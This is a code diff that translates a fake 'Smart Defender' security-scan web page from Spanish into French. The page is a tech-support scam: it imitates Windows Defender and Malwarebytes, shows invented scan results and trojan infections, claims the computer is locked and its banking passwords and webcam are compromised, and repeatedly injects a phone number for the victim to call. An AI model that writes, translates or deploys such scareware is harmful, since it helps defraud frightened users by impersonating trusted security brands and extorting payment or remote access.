@@ -140,7 +140,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                 <div class="activate_lic">
                     <ul>
                         <li><a href="#">
-                                <button>Activar licencia</button>
+                                <button>Activer la licence</button>
                             </a></li>
                         <li><a href="#"><img src="setting.png"></a></li>
                         <li><a href="#"><img src="que.png"></a></li>
@@ -154,7 +154,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             <div class="row">
                 <div class="col-md-6">
                     <div class="quick_scan">
-                        <p><img src="virus-scan.png"><span>Análisis rápido</span></p>
+                        <p><img src="virus-scan.png"><span>Scan rapide</span></p>
                     </div>
                 </div>
                 <div class="col-md-6">
@@ -177,7 +177,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                 <table class="table table-bordered">
                     <thead>
                     <tr>
-                        <th scope="col">Objetos escaneados</th>
+                        <th scope="col">Objets scannés</th>
                         <th scope="col">
                             <div class="counter col_fourth">
                                 <h2 class="timer count-title count-number" data-to="51900" data-speed="5000"></h2>
@@ -185,12 +185,12 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                         </th>
                     </tr>
                     <tr>
-                        <th scope="col">Tiempo transcurrido</th>
+                        <th scope="col">Temps écoulé</th>
                         <th scope="col"><h2 class="timer count-title count-number" data-to="5"
                                                                 data-speed="5000"></h2> secs</th>
                     </tr>
                     <tr>
-                        <th scope="col">Amenazas encontradas</th>
+                        <th scope="col">Menaces trouvées</th>
                         <th scope="col" style="color: red;"><h2 class="timer count-title count-number" data-to="21"
                                                                 data-speed="2000"></h2></th>
                     </tr>
@@ -203,17 +203,17 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                 <div class="col-md-6">
                     <div class="bt_can">
                         <div class="btn-group" role="group" aria-label="Basic example">
-                            <button type="button" class="btn btn-secondary">Cancelar</button>
+                            <button type="button" class="btn btn-secondary">Annuler</button>
                         </div>
                         <div class="btn-group" role="group" aria-label="Basic example">
-                            <button type="button" class="btn btn-secondary">Pausa</button>
+                            <button type="button" class="btn btn-secondary">Pause</button>
                         </div>
                     </div>
                 </div>
                 <div class="col-md-6">
                     <div class="bt_can2">
                         <div class="btn-group" role="group" aria-label="Basic example">
-                            <button type="button" class="btn btn-secondary" id="">Escaneos</button>
+                            <button type="button" class="btn btn-secondary" id="">Analyses</button>
                         </div>
                     </div>
                 </div>
@@ -240,7 +240,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                 <div class="activate_lic">
                     <ul>
                         <li><a href="#">
-                                <button>Activar licencia</button>
+                                <button>Activer la licence</button>
                             </a></li>
                         <li><a href="#"><img src="bell.png"></a></li>
                         <li><a href="#"><img src="setting.png"></a></li>
@@ -255,7 +255,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             <div class="row">
                 <div class="col-md-6">
                     <div class="quick_scan">
-                        <p><img src="virus-scan.png"><span>Escáner</span></p>
+                        <p><img src="virus-scan.png"><span>Scanner</span></p>
                     </div>
                 </div>
                 <div class="col-md-6">
@@ -270,16 +270,16 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
         <div class="scan_body">
             <div class="row">
                 <div class="col-md-4">
-                    <h4 class="new_heading">Resultados</h4>
+                    <h4 class="new_heading">Résultats analyse menaces</h4>
                 </div>
                 <div class="col-md-8">
                     <div class="total_detail">
                         <ul>
-                            <li><a href="#"><p>Elementos detectados</p>
+                            <li><a href="#"><p>Éléments détectés</p>
                                     <p>21</p></a></li>
-                            <li><a href="#"><p>Tiempo de escaneo</p>
+                            <li><a href="#"><p>Temps de Scanne</p>
                                     <p>5 secs</p></a></li>
-                            <li><a href="#"><p>Artículo escaneado</p>
+                            <li><a href="#"><p>Elements Scannés</p>
                                     <p>51,900</p></a></li>
                         </ul>
                     </div>
@@ -296,10 +296,10 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                                 <label class="form-check-label" for="defaultCheck1"></label>
                             </div>
                         </th>
-                        <th>Nombre</th>
-                        <th>Tipo</th>
-                        <th>Tipo de objeto</th>
-                        <th>Localización</th>
+                        <th>Nom</th>
+                        <th>Type</th>
+                        <th>Type d'Object</th>
+                        <th>Localisation</th>
                     </tr>
                     </thead>
                     <tbody id="table_scroll">
@@ -446,12 +446,12 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                         <div class="dropdown">
                             <a class="btn btn-secondary dropdown-toggle" style="width:126px;" href="#" role="button"
                                id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-                                Resultado
+                                Résult
                             </a>
                             <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
-                                <a class="dropdown-item" href="#">Acción</a>
-                                <a class="dropdown-item" href="#">Otra acción</a>
-                                <a class="dropdown-item" href="#">Otra</a>
+                                <a class="dropdown-item" href="#">Action</a>
+                                <a class="dropdown-item" href="#">Autre action</a>
+                                <a class="dropdown-item" href="#">Autre</a>
                             </div>
                         </div>
                     </div>
@@ -459,10 +459,10 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                 <div class="col-md-6">
                     <div class="bt_can2">
                         <div class="btn-group" role="group" aria-label="Basic example">
-                            <button type="button" class="btn btn-secondary">Cerrar</button>
+                            <button type="button" class="btn btn-secondary">Fermer</button>
                         </div>
                         <div class="btn-group" role="group" aria-label="Basic example">
-                            <button type="button" class="btn btn-secondary bg_blue">Cuarentena</button>
+                            <button type="button" class="btn btn-secondary bg_blue">Quarantaine</button>
                         </div>
                     </div>
                 </div>
@@ -489,7 +489,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                 <div class="activate_lic">
                     <ul>
                         <li><a href="#">
-                                <button>Activar licencia</button>
+                                <button>Activer la licence</button>
                             </a></li>
                         <li><a href="#"><img src="bell.png"></a></li>
                         <li><a href="#"><img src="setting.png"></a></li>
@@ -504,7 +504,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             <div class="row">
                 <div class="col-md-6">
                     <div class="quick_scan">
-                        <p><img src="virus-scan.png"><span>Escáner</span></p>
+                        <p><img src="virus-scan.png"><span>Scanner</span></p>
                     </div>
                 </div>
                 <div class="col-md-6">
@@ -521,9 +521,9 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                 <div class="col-md-12">
                     <div class="total_detail_scan">
                         <ul>
-                            <li><a href="#">Escáner</a></li>
-                            <li><a href="#">Programador de escaneo</a></li>
-                            <li><a href="#">Informes</a></li>
+                            <li><a href="#">Scanner</a></li>
+                            <li><a href="#">Planificateur d'analyse</a></li>
+                            <li><a href="#">Rapports</a></li>
                         </ul>
                     </div>
                 </div>
@@ -539,26 +539,26 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                     <div class="col-md-4">
                         <div class="scan_pro mar_top">
                             <ul>
-                                <li><i class="fa fa-check" aria-hidden="true"></i> Buscando actualizaciones</li>
-                                <li><i class="fa fa-check" aria-hidden="true"></i> Escanear memoria</li>
-                                <li><i class="fa fa-check" aria-hidden="true"></i> Escanear elementos de inicio</li>
+                                <li><i class="fa fa-check" aria-hidden="true"></i> Vérification mises à jour</li>
+                                <li><i class="fa fa-check" aria-hidden="true"></i> Analyser mémoire</li>
+                                <li><i class="fa fa-check" aria-hidden="true"></i> Analyser les éléments de démarrage</li>
                                 <li>
                                     <div class="circular-spinner"></div>
-                                    <span>Registro de escaneo</span></li>
-                                <li>Sistema de archivos de escaneo</li>
+                                    <span>Analyse du registre</span></li>
+                                <li>Analyse du système de fichiers</li>
                             </ul>
                         </div>
                     </div>
                     <div class="col-md-4">
                         <div class="scan_dur">
-                            <p><strong>Duración del escaneo</strong></p>
+                            <p><strong>Durée de l'analyse</strong></p>
                             <p>5sec 0s</p>
                             <p>9sec 0s</p>
                             <br>
-                            <p><strong>Articulos escaneados</strong></p>
+                            <p><strong>Articles numérisés</strong></p>
                             <p>51,900</p>
                             <br>
-                            <p><strong>Detecciones</strong></p>
+                            <p><strong>Détections</strong></p>
                             <p>21</p>
                         </div>
                     </div>
@@ -574,9 +574,9 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                 </div>
                 <div class="col-md-10">
                     <div class="make_this">
-                        <p>Haga que esta sea la última preocupación por las amenazas en línea</p>
-                        <p>Malwarebytes Premium detiene malware, virus y más sin atascar su computadora.
-                            Mejorado a Premium</p>
+                        <p>Ne vous inquiétez plus des menaces en ligne</p>
+                        <p>Malwarebytes Premium bloque les logiciels malveillants, les virus et bien plus encore sans enliser votre ordinateur.
+                             Passer à la version premium</p>
                     </div>
                 </div>
             </div>
@@ -588,23 +588,23 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
         <div class="col-md-12">
             <div class="right-foot" style="text-align: center;">
                 <span id="footertxt"><img src="microsoft.png"> Smart Defender: </span><span
-                        style="font-weight: 700;padding-left: 13px;color: #fff;">Contacto con soporte técnico <span
-                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"><script>document.write(phone_number)</script>             (Línea de ayuda de seguridad)</span></span>
+                        style="font-weight: 700;padding-left: 13px;color: #fff;">Contact Smart Defender <span
+                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"><script>document.write(phone_number)</script>             (Ligne d'assistance de sécurité)</span></span>
             </div>
         </div>
         <div class="col-md-12">
-            <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 18px;">Defender SmartScreen evitó que se indicara una aplicación no reconocida. Ejecutar esta aplicación podría poner tu PC
-                    en riesgo. Smart Defender Scan ha encontrado adware potencialmente no deseado en este dispositivo que puede robar
-                    sus contraseñas, identidad en línea, información financiera, archivos personales, imágenes o
-                    documentos.</small></marquee>
+            <marquee width="100%" direction="left" height="100px"><small class="text-left"
+                                                                         style="color: #eee;font-size: 18px;">Defender SmartScreen va vous aider a empêché les application non reconnue de s'afficher. L'exécution de cette application peut mettre votre PC
+                     en danger. Smart Defender Scan a détecté sur cet appareil un logiciel publicitaire potentiellement indésirable susceptible de voler
+                     vos mots de passe, votre identité en ligne, vos informations financières, vos fichiers personnels, vos photos ou
+                     documents.</small></marquee>
         </div>
     </div>
 </div>
-
 <div id="poptxt" class="lightbox">
     <div class="ilb top">
         <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
-            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span> Centro de seguridad de Smart Defender</span>
+            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span> Centre de sécurité Smart Defender</span>
             <span id="txts1" class="fl title2"><a href="#"><img src="cross.png"></a></span>
         </div>
     </div>
@@ -619,10 +619,10 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
     </div>
 
     <div id="disclaimer">
-        El acceso a este ordenador ha sido bloqueado por razones de seguridad.<br>
+        Votre PC est peut-être vulnérable aux virus et menaces.<br>
         
 
-        <span class="support" style="font-size:22px;">Póngase en contacto con el soporte técnico:&nbsp; 
+        <span class="support" style="font-size:22px;">Appelez gratuitement l'assistance Smart Defender:&nbsp; 
         <img src="phone1.png"style="width: 200px;" id="banner">
         <!--<span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> <script>document.write(phone_number)</script> -->
         
@@ -639,14 +639,14 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             <li>
                 <a href="#">
                     <div class="fr button2">
-                        <span id="addtochromebutton">Cerrar</span>
+                        <span id="addtochromebutton">Fermer</span>
                     </div>
                 </a>
             </li>
             <li>
                 <a href="#">
                     <div class="fr button" style="    padding: 10px 20px 10px 20px;">
-                        <span id="addtochromebutton">Aceptar</span>
+                        <span id="addtochromebutton">Autoriser</span>
                     </div>
                 </a>
             </li>
@@ -655,20 +655,20 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 </div>
 
 <div class="answer_list" style="display:none;background-color:rgb(226 227 229 / 90%);height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
-    <p style="color:#383d41;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center"Advertencia: no reinicie su computadora<br>Su computadora puede estar infectada.
+    <p style="color:#383d41;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center"Attention - Ne redémarrez pas votre ordinateur<br>Votre ordinateur peut-ête infecté.
 <br>
-Comuníquese con el soporte gratuito de inmediato. Un ingeniero de Smart Defender lo ayudará a proteger su computadora por teléfono.
-      <strong>Póngase en contacto con el soporte inmediatamente: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> <script>document.write(phone_number)</script>
+Veuillez contacter gratuitement l'assistance immédiatement. Un ingénieur Smart Defender vous aidera à protéger votre ordinateur par téléphone.
+      <strong>Contactez l'assistance immédiatement: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> <script>document.write(phone_number)</script>
         </span>
       </strong>
     </p>
   </div>
 
 
-  <div id="chat" style="display: block;">
+ <div id="chat" style="display: block;">
     <img src="def.png" style="margin-left:0px">
     <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Smart Defender</span>
-    <p style="font-weight:600;font-size:24px;margin-left:10px">Soporte técnico  <br>
+    <p style="font-weight:600;font-size:24px;margin-left:10px">Centre de sécurité  <br>
     </p>
     <h4 style="font-weight:600;font-size:22px; margin-left:10px"> <script>document.write(phone_number)</script>
       <br>(Security Toll Free)
@@ -684,7 +684,7 @@ Comuníquese con el soporte gratuito de inmediato. Un ingeniero de Smart Defende
       </svg>
     </div>
   </div>
-
+	
   <div id="pop_up_new" class="cardcontainer" style="cursor: none; background-color:blue;">
     <p class="text-center" style="    font-size: 16px;
     font-weight: normal;
@@ -693,36 +693,37 @@ Comuníquese con el soporte gratuito de inmediato. Un ingeniero de Smart Defende
     padding: 5px 10px;
     color: #FFFFFF !important;
     color: #414141;font-weight: bold;
-    margin-top: 8px;">Defender - Advertencia de Seguridad</	p>
-    <p>** Notificación de protección de red y firewall **</p>
-    <p>Su computadora nos ha alertado de que ha sido infectada con un software espía troyano. Los siguientes datos han sido
-        comprometida.</p>
-    <p>&gt; Credenciales de correo electrónico<br>
-        &gt; Contraseñas bancarias<br>
-        &gt; Iniciar sesión en redes sociales<br>
-        &gt; Imágenes y documentos / Cámara web
+    margin-top: 8px;">Windows-Defender - Avertissement de sécurité</p>
+    <p>** Notification de pare-feu et de protection du réseau **</p>
+    <p>Votre ordinateur nous a alerté qu'il a été infecté par un cheval de Troie espion. Les données suivantes ont été
+         compromis.</p>
+    <p>&gt; Identifiants de messagerie<br>
+        &gt; Mots de passe bancaires<br>
+        &gt; Connexion aux réseaux sociaux<br>
+        &gt; Photos et documents / Webcam
     </p>
-    <p>Defender Scan ha encontrado adware potencialmente no deseado en este dispositivo que puede robar sus contraseñas en línea
-        identidad, información financiera, archivos personales, fotografías o documentos.</p>
-    <p>Debe comunicarse con nosotros de inmediato para que nuestros ingenieros puedan guiarlo a través del proceso de eliminación a través del
-        teléfono.</p>
-    <p>Llame al soporte técnico de inmediato para informar esta amenaza, evitar el robo de identidad y desbloquear el acceso a este
-        dispositivo.</p>
-    <p>Sistema de protección firewall en tiempo real. Acción requerida para proteger su PC.</p>
-    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Llame al soporte técnico: <strong>
-            <script>document.write(phone_number)</script>             (Línea de ayuda de seguridad) </strong></p>
+    <p>Windows-Defender Scan a détecté un logiciel publicitaire potentiellement indésirable sur cet appareil, capable de voler vos mots de passe en ligne.
+         identité, informations financières, dossiers personnels, photos ou documents.</p>
+    <p>Vous devez nous contacter immédiatement afin que nos ingénieurs puissent vous guider tout au long du processus de suppression.
+         téléphone.</p>
+    <p>Appelez immédiatement le support Windows pour signaler cette menace, empêcher le vol d'identité et débloquer l'accès à cette menace.
+         appareil.</p>
+    <p>Système de protection par pare-feu en temps réel. Action requise pour protéger votre PC.</p>
+    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Appelez l'assistance Windows : <strong>
+            <script>document.write(phone_number)</script>             (Ligne d'assistance de sécurité) </strong></p>
     <div class="action_buttons"><a class="active" id="leave_page"
                                    style="cursor: pointer; color: #FFFFFF !important;">OK</a> <a class="active"
                                                                                                  id="leave_page"
-                                                                                                 style="color: #FFFFFF !important;">Cancelar</a>
+                                                                                                 style="color: #FFFFFF !important;">Annuler</a>
     </div>
-</div>  
+</div>
+
 <div id="welcomeDiv"
      style=" display:none; background-color:rgb(40 40 40 / 62%); height: auto; width: 550px; margin-left:30%;position: absolute;z-index: 9999999999;  "
      class="answer_list">
-    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Advertencia: no reinicie su computadora
-        <br>Su computadora puede estar infectada.
-        <br> Comuníquese con el soporte gratuito de inmediato. Un ingeniero de Smart Defender lo ayudará a proteger su computadora por teléfono.</p>
+    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Attention - Ne redémarrez pas votre ordinateur
+        <br>Votre ordinateur peut-ête infecté. 
+        <br> Veuillez contacter gratuitement l'assistance immédiatement. Un ingénieur Smart Defender vous aidera à protéger votre ordinateur par téléphone.</p>
 </div>
 <!-- Optional JavaScript; choose one of the two! -->
 <!-- Option 1: jQuery and Bootstrap Bundle (includes Popper) -->
